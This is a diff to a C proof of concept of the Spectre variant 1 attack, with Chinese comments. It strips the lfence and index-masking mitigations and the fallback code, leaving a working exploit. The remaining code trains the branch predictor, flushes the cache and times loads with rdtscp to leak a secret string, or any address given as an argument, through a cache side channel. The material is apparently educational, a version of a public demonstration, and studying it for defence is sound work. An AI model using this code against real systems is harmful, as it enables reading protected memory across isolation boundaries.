@@ -1,35 +1,6 @@
 #include <stdio.h>
 #include <stdint.h>
-#ifdef _MSC_VER // 这个宏在 Windows 的 Microsoft 编译器（MSVC） 中默认定义
-    #include <intrin.h> /* 需要支持 rdtsc, rdtscp, clflush, mfence*/
-    #pragma optimize("gt",on) //即使整个程序用的是 -Od（关闭优化）编译，这一部分代码也可以局部开启更高性能的优化，用于提升时序测量等性能关键代码段的精度。
-#else  // 非 MSVC 编译器,比如gcc,Clang
-    #include <x86intrin.h> /* 需要支持 rdtsc, rdtscp, clflush, mfence*/
-#endif
-
-/*********************************************************************
-*
-* 根据编译器和平台支持情况，判断是否支持 SSE2 指令集
-*
-* 如果不支持，就定义 NOSSE2，以禁用某些依赖 SSE2 的优化操作（如缓存清除、内存屏障和精确计时）。
-*
-**********************************************************************/
-#ifdef _MSC_VER
-    #if _M_IX86_FP==1 /*表示启用了哪种级别的 SSE*/
-        #define NOSSE2
-    #endif
-#else
-    #if defined(__SSE__) && !defined(__SSE2__)
-        #define NOSSE2
-    #endif
-#endif
-
-/* 如果定义了 NOSSE2，则禁用上面三种指令，整个程序将采用降级的方式运行 */
-#ifdef NOSSE2
-    #define NORDTSCP
-    #define NOMFENCE
-    #define NOCLFLUSH
-#endif
+#include <x86intrin.h> /* 需要支持 rdtsc, rdtscp, clflush, mfence*/
 
 /********************************************************************
 受害者代码
@@ -47,67 +18,13 @@ uint8_t array2[256 * 512];
 char *secret = "The Magic Words are Squeamish Ossifrage.";
 uint8_t temp = 0; /* 赋值，防止受害者函数被编译器优化 */
 
-/*在编译命令中定义宏 对推测值进行掩码操作，可以看成是SLE*/
-#ifdef LINUX_KERNEL_MITIGATION
-    static inline unsigned long array_index_mask_nospec(unsigned long index, unsigned long size) {
-        unsigned long mask;
-            __asm__ __volatile__ (
-                "cmp %1,%2; sbb %0,%0;"   // 对比 size和index 的大小，用带借减法进行掩码
-                : "=r" (mask)             // 输出：mask ← sbb 结果
-                : "g" (size), "r" (index) // 输入：size → %1, index → %2
-                : "cc"                    // 说明会影响 CPU 标志位
-            );
-        return mask;
-}
-#endif
 
 /* 受害者函数 */
 void victim_function(size_t x) {
     if (x < array1_size) {
-        /* 加入屏障阻止推测 */
-        #ifdef INTEL_MITIGATION
-            _mm_lfence();
-        #endif
-        /* 启用定义的缓解方法，即对推测值进行掩码*/
-        #ifdef LINUX_KERNEL_MITIGATION
-            x &= array_index_mask_nospec(x, array1_size);
-        #endif
-
         temp &= array2[array1[x] * 512];
     }
 }
-
-/********************************************************************
-* 在不支持 clflush 指令（如某些老旧处理器或特定编译配置下）时
-* 手动实现缓存刷新（flush）效果的替代方案
-********************************************************************/
-
-#ifdef NOCLFLUSH
-    #define CACHE_FLUSH_ITERATIONS 2048
-    #define CACHE_FLUSH_STRIDE 4096 // 一个页面大小是 4KB
-    // 8MB（2048 × 4096） 的数组 现代 CPU 的 L1/L2/L3 cache 总容量往往小于 8MB
-    uint8_t cache_flush_array[CACHE_FLUSH_STRIDE * CACHE_FLUSH_ITERATIONS];
-
-    void flush_memory_sse(uint8_t *addr) {
-        float *p = (float *)addr;
-        float c = 0.f;
-        // 创建一个 128-bit (16字节)的 SSE 向量，包含四个 float 值（全是 0）。
-        __m128 i = _mm_setr_ps(c, c, c, c);
-
-        // 写入 16 个 SSE 流向量（= 64 个 float = 256 字节）
-        /*
-        * 一共写入 16 个地址
-        * 每次跨越 16 字节
-        * 共影响 256 字节范围
-        * 覆盖多个 cache line（每行通常 64 字节）
-        */
-        for (int k = 0; k < 4; k++) {
-            for (int l = 0; l < 4; l++) {
-                _mm_stream_ps(&p[(l * 4 + k) * 4], i);
-            }
-        }
-    }
-#endif
 
 /* 读取缓存一个字节
 * 实现通过缓存时序侧信道推测出 secret 字符串中的一个字节
@@ -132,37 +49,20 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
     register uint64_t time1, time2;
     volatile uint8_t *addr;
 
-    #ifdef NOCLFLUSH
-        int junk2 = 0; /* 赋值，防止后续循环被优化 */
-        int l;
-        (void)junk2; // 使用变量但不执行任何操作，防止优化器移除它
-    #endif
-
     // 初始化
     for (i = 0; i < 256; i++) results[i] = 0;
 
-    
     for (tries = 999; tries > 0; tries--) {
         /* 把array2赶出缓存 */
-        #ifndef NOCLFLUSH
-            for (i = 0; i < 256; i++) _mm_clflush(&array2[i * 512]);
-        #else
-            for (j = 0; j < 16; j++) // 增加刷新次数
-                for (i = 0; i < 256; i++)
-                    flush_memory_sse(&array2[i * 512]);
-        #endif
+        for (i = 0; i < 256; i++){
+            _mm_clflush(&array2[i * 512]);
+        }
 
         /* 训练分支预测器 */
         training_x = tries % array1_size; //正常访问
         for (j = 29; j >= 0; j--) {
             /* 将array1_size赶出缓存 防止推测时其在缓存 */
-            #ifndef NOCLFLUSH
-                _mm_clflush(&array1_size);
-            #else
-                //用垃圾数组 cache_flush_array 填满缓存
-                for (l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l -= CACHE_FLUSH_STRIDE)
-                    junk2 = cache_flush_array[l];
-            #endif
+            _mm_clflush(&array1_size);
 
             // 时间延迟（免优化）
             for (volatile int z = 0; z < 100; z++) {}
@@ -182,26 +82,10 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
             mix_i = ((i * 167) + 13) & 255; //因为 167 与 256 互质，构成模 256 下的乘法置换，加 13 只是平移。能确保全排列
             addr = &array2[mix_i * 512];
 
-            #ifndef NORDTSCP
-                time1 = __rdtscp(&junk);
-                junk = *addr; // 侧信道发生在这
-                time2 = __rdtscp(&junk) - time1;
-            #else
-                #ifndef NOMFENCE
-                    _mm_mfence();
-                    time1 = __rdtsc();
-                    _mm_mfence();
-                    junk = *addr;
-                    _mm_mfence();
-                    time2 = __rdtsc() - time1;
-                    _mm_mfence();
-                #else
-                    //这种测时间精度低
-                    time1 = __rdtsc();
-                    junk = *addr;
-                    time2 = __rdtsc() - time1;
-                #endif
-            #endif
+            time1 = __rdtscp(&junk);
+            junk = *addr; // 侧信道发生在这
+            time2 = __rdtscp(&junk) - time1;
+
             // 避免误报：array1[training_x] 对应的 array2[array1[training_x] * 512] 会被真实访问
             if ((int)time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
                 results[mix_i]++;
@@ -239,18 +123,6 @@ int main(int argc, const char **argv) {
     uint8_t value[2];
     int i;
 
-    /* 防止未初始化的内存访问影响时间测量的准确性 */
-    #ifdef NOCLFLUSH
-        for (i = 0; i < (int)sizeof(cache_flush_array); i++)
-            cache_flush_array[i] = 1;
-    #endif
-    for (i = 0; i < (int)sizeof(array2); i++){
-        array2[i] = 1;
-    }
-
-    if (argc >= 2){
-        sscanf(argv[1], "%d", &cache_hit_threshold);
-    }
     // 方便任意读取某段地址的任意长度
     if (argc >= 4) {
         sscanf(argv[2], "%p", (void **)&malicious_x);
@@ -259,44 +131,6 @@ int main(int argc, const char **argv) {
     }
 
     printf("Using a cache hit threshold of %d.\n", cache_hit_threshold);
-
-    printf("Build:\n");
-
-    printf("RDTSCP\t");
-    #ifndef NORDTSCP
-        printf("Yes\n");
-    #else
-        printf("No\n");
-    #endif
-
-    printf("MFENCE\t");
-    #ifndef NOMFENCE
-        printf("Yes\n");
-    #else
-        printf("No\n");
-    #endif
-
-    printf("CLFLUSH\t");
-    #ifndef NOCLFLUSH
-        printf("Yes\n");
-    #else
-        printf("No\n");
-    #endif
-
-    printf("INTEL_MITIGATION\t");
-    #ifdef INTEL_MITIGATION
-        printf("Yes\n");
-    #else
-        printf("No\n");
-    #endif
-
-    printf("LINUX_KERNEL_MITIGATION\t");
-    #ifdef LINUX_KERNEL_MITIGATION
-        printf("Yes\n");
-    #else
-        printf("No\n");
-    #endif
-
 
     printf("Reading %d bytes:\n", len);
     while (--len >= 0) {
